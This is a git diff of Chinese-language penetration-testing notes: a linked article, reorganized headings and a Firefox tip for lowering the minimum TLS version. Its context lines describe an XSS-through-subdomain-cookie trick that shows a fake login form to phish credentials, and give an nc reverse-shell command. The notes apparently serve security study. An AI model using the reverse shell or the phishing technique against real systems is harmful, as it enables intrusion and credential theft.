@@ -41,6 +41,13 @@
 - 利用方法：在可控子域部署恶意页面，该页面将载荷写入根域Cookie，再重定向到目标页面。XSS执行JS更改页面显示登录界面，诱骗受害者输入登录凭据
 - 遇到问题：通过利用子域名的漏洞将本地XSS变成远程XSS；“正牌”Cookie优先级比子域名设置的Cookie高，因此对已登录用户来说此漏洞无危害，于是转而逆向JS，让页面显示登录界面，诱骗未登录用户输入账号密码
 
+[基于未授权的渗透测试技巧总结](https://mp.weixin.qq.com/s/lDT80mNR_ubthHgArRCMLw)
+
+- 产生点：
+- 类型
+- 利用方法
+- 遇到问题
+
 # 思路
 
 挖洞的目的：证明目标服务器不安全：权限、数据、破坏。除了传统漏洞外，也要从这三个角度思考有没有利用点
@@ -134,7 +141,13 @@ localStorage与sessionStorage
 - 接口权限
 - 数据行级权限
 
-# PTES Technical Guidelines
+# 搜索引擎
+
+待补充
+
+# 其他
+
+## PTES Technical Guidelines
 
 - 信息收集
 - 漏洞分析（Vulnerability Analysis）：发现漏洞，并分析可能危害
@@ -146,8 +159,6 @@ localStorage与sessionStorage
   - 两者之间没有明确分界线。区分主要是为了项目管理方便
 - 后渗透（Post Exploitation）：取得系统控制权后扩大成果
 - 报告
-
-# 其他
 
 ## Host碰撞
 
@@ -216,3 +227,8 @@ nc -e /bin/bash ip port           # 需要目标安装了nc
 关键信息基础设施保护
 
 商用密码应用安全性评估
+
+## TLS版本过低
+
+Firefox：打开about:config，将`security.tls.version.min`改成1
+
